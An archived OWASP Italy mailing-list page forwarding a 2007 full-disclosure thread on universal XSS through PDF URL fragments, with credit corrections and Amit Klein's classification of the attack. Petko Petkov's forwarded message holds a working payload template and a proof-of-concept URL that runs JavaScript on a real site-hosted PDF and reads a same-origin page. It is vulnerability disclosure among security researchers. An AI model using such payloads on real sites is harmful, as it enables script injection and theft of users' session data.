<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
<HTML>
 <HEAD>
   <TITLE> [Owasp-italy] Fwd: [WEB SECURITY] Universal XSS with PDF files:	highly dangerous
   </TITLE>
   <LINK REL="Index" HREF="index.html" >
   <LINK REL="made" HREF="mailto:owasp-italy%40lists.owasp.org?Subject=%5BOwasp-italy%5D%20Fwd%3A%20%5BWEB%20SECURITY%5D%20Universal%20XSS%20with%20PDF%20files%3A%0A%09highly%20dangerous&In-Reply-To=1167813420.459b6b2c0a8d7%40www.mail2web.ch">
   <META NAME="robots" CONTENT="index,nofollow">
   <META http-equiv="Content-Type" content="text/html; charset=us-ascii">
   
   <LINK REL="Next"  HREF="000224.html">
 </HEAD>
 <BODY BGCOLOR="#ffffff">
   <H1>[Owasp-italy] Fwd: [WEB SECURITY] Universal XSS with PDF files:	highly dangerous</H1>
    <B>Matteo Meucci</B> 
    <A HREF="mailto:owasp-italy%40lists.owasp.org?Subject=%5BOwasp-italy%5D%20Fwd%3A%20%5BWEB%20SECURITY%5D%20Universal%20XSS%20with%20PDF%20files%3A%0A%09highly%20dangerous&In-Reply-To=1167813420.459b6b2c0a8d7%40www.mail2web.ch"
       TITLE="[Owasp-italy] Fwd: [WEB SECURITY] Universal XSS with PDF files:	highly dangerous">matteo.meucci at gmail.com
       </A><BR>
    <I>Wed Jan  3 12:36:32 EST 2007</I>
    <P><UL>
        
        <LI>Next message: <A HREF="000224.html">[Owasp-italy] [WEB SECURITY] Universal XSS with PDF files:	highly dangerous
</A></li>
         <LI> <B>Messages sorted by:</B> 
              <a href="date.html#223">[ date ]</a>
              <a href="thread.html#223">[ thread ]</a>
              <a href="subject.html#223">[ subject ]</a>
              <a href="author.html#223">[ author ]</a>
         </LI>
       </UL>
    <HR>  
<!--beginarticle-->
<PRE>FYI.

Applausi copiosi alla coppia Di Paola - Fedon che hanno presentato
&quot;Subverting AJAX&quot; al 23-esimo CCC e sono gi&#224; celebrit&#224;!

Per approfondimenti:
<A HREF="http://events.ccc.de/congress/2006/Fahrplan/events/1602.en.html">http://events.ccc.de/congress/2006/Fahrplan/events/1602.en.html</A>

Buon anno!
Mat

---------- Forwarded message ----------
From: <A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">sven.vetsch at disenchant.ch</A> &lt;<A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">sven.vetsch at disenchant.ch</A>&gt;
Date: Jan 3, 2007 9:37 AM
Subject: Re: [WEB SECURITY] Universal XSS with PDF files: highly dangerous
To: &quot;pdp (architect)&quot; &lt;<A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">pdp.gnucitizen at googlemail.com</A>&gt;
Cc: <A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">full-disclosure at lists.grok.org.uk</A>, <A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">bugtraq at securityfocus.com</A>, Web
Security &lt;<A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">websecurity at webappsec.org</A>&gt;


Quoting &quot;pdp (architect)&quot; &lt;<A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">pdp.gnucitizen at googlemail.com</A>&gt;:

&gt;<i> This finding was originally mentioned by Sven Vetsch, on his blog.
</I>&gt;<i> This is a very good and quite interesting. Good work.
</I>
Sorry about that but that's wrong. All the credits have to go to Stefano Di
Paola and Giorgio Fedon. They presented that stuff at the 23C3 in Berlin. The
only thing that I did was an overview and I found out, that it doesn't matter
how the parameter is called. I &quot;just&quot; forgot to copy paste the credits from my
original document, to the blog entry. I'm very sorry about that and of course I
putted it in my entry now.

Regards,
Disenchant / Sven Vetsch

---------- Forwarded message ----------
Amit Klein &lt;<A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">aksecurity at gmail.com</A>&gt;

pdp (architect) wrote:
&gt;<i> I will be very quick and just point to links where you can read about
</I>&gt;<i> this issue.
</I>&gt;<i>
</I>&gt;<i> It seams that PDF documents can execute JavaScript code for no
</I>&gt;<i> apparent reason by using the following template:
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i> <A HREF="http://path/to/pdf/file.pdf#whatever_name_you_want=javascript:your_code_here">http://path/to/pdf/file.pdf#whatever_name_you_want=javascript:your_code_here</A>
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i> You must understand that the attacker doesn't need to have write
</I>&gt;<i> access to the specified PDF document. In order to get an XSS vector
</I>&gt;<i> working you need to have a PDF file hosted on the target and that's
</I>&gt;<i> all about it. The rest is just a matter of your abilities and desires.
</I>&gt;<i>
</I>Amazing, and kudos to Sven Vetsch who found this.

Note that from attack categorization perspective, it appears to be a
twisted example of DOM based XSS
(<A HREF="http://www.webappsec.org/projects/articles/071105.shtml">http://www.webappsec.org/projects/articles/071105.shtml</A>). I suppose PDF
retrieves the URL from the browser (probably from a degenerate DOM the
browser provides it - after all, the document object is available to the
payload JS code!), parses it and uses the fragment. Since fragments are
used, the payload doesn't travel to the target web server (!). I
mentioned the possible use of fragments as a particularly nasty attack
vector (impossible to detect on server) in the &quot;DOM based XSS&quot; writeup.

-Amit

---------- Forwarded message ----------
pdp (architect) &lt;<A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">pdp.gnucitizen at googlemail.com</A>&gt;

I will be very quick and just point to links where you can read about
this issue.

It seams that PDF documents can execute JavaScript code for no
apparent reason by using the following template:

   <A HREF="http://path/to/pdf/file.pdf#whatever_name_you_want=javascript:your_code_here">http://path/to/pdf/file.pdf#whatever_name_you_want=javascript:your_code_here</A>

You must understand that the attacker doesn't need to have write
access to the specified PDF document. In order to get an XSS vector
working you need to have a PDF file hosted on the target and that's
all about it. The rest is just a matter of your abilities and desires.

This finding was originally mentioned by Sven Vetsch, on his blog.
This is a very good and quite interesting. Good work.

There is a POC I composed:

<A HREF="http://www.google.com/librariancenter/downloads/Tips_Tricks_85x11.pdf#something=javascript:function%20createXMLHttpRequest(">http://www.google.com/librariancenter/downloads/Tips_Tricks_85x11.pdf#something=javascript:function%20createXMLHttpRequest(</A>){%20%20%20try{%20return%20new%20ActiveXObject('Msxml2.XMLHTTP');%20}catch(e){}%20%20%20try{%20return%20new%20ActiveXObject('Microsoft.XMLHTTP');%20}catch(e){}%20%20%20try{%20return%20new%20XMLHttpRequest();%20}catch(e){}%20%20%20return%20null;}var%20xhr%20=%20createXMLHttpRequest();xhr.onreadystatechange%20=%20function(){%20%20%20%20if%20(xhr.readyState%20==%204)%20%20%20%20%20%20%20%20alert(xhr.responseText);};xhr.open('GET',%20'<A HREF="http://www.google.com',%20true">http://www.google.com',%20true</A>);xhr.send(null);

More on the matter can be found here:

<A HREF="http://www.gnucitizen.org/blog/danger-danger-danger/">http://www.gnucitizen.org/blog/danger-danger-danger/</A>
<A HREF="http://www.disenchant.ch/blog/hacking-with-browser-plugins/34">http://www.disenchant.ch/blog/hacking-with-browser-plugins/34</A>

--
pdp (architect) | petko d. petkov
<A HREF="http://www.gnucitizen.org">http://www.gnucitizen.org</A>
</PRE>


<!--endarticle-->
    <HR>
    <P><UL>
        <!--threads-->
	
	<LI>Next message: <A HREF="000224.html">[Owasp-italy] [WEB SECURITY] Universal XSS with PDF files:	highly dangerous
</A></li>
         <LI> <B>Messages sorted by:</B> 
              <a href="date.html#223">[ date ]</a>
              <a href="thread.html#223">[ thread ]</a>
              <a href="subject.html#223">[ subject ]</a>
              <a href="author.html#223">[ author ]</a>
         </LI>
       </UL>

<hr>
<a href="http://lists.owasp.org/mailman/listinfo/owasp-italy">More information about the Owasp-italy
mailing list</a><br>
</body></html>
